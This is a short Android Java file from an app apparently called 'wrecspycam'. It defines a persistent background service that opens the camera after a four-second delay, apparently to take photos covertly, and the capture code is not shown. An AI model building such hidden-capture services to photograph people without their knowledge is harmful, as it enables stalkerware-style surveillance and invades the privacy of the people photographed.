package com.byteshaft.wrecspycam;

import android.app.Service;
import android.content.Intent;
import android.hardware.Camera;
import android.os.Handler;
import android.os.IBinder;

@SuppressWarnings("deprecation")
public class SpyService extends Service {

    private Camera mCamera;
    private CameraSurface mCameraSurface;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        takeDelayedPhoto(4000);
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void takeDelayedPhoto(int delay) {
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    mCamera = Camera.open();
                    mCameraSurface = new CameraSurface(getApplicationContext(), mCamera);
                    mCameraSurface.create();
                } catch (RuntimeException e) {
                    e.printStackTrace();
                }
            }
        }, delay);

    }

//    private void releaseCamera() {
//        mCamera.release();
//        if (mCamera != null) {
//            mCamera = null;
//            mCameraSurface.destroy();
//        }
//    }
}
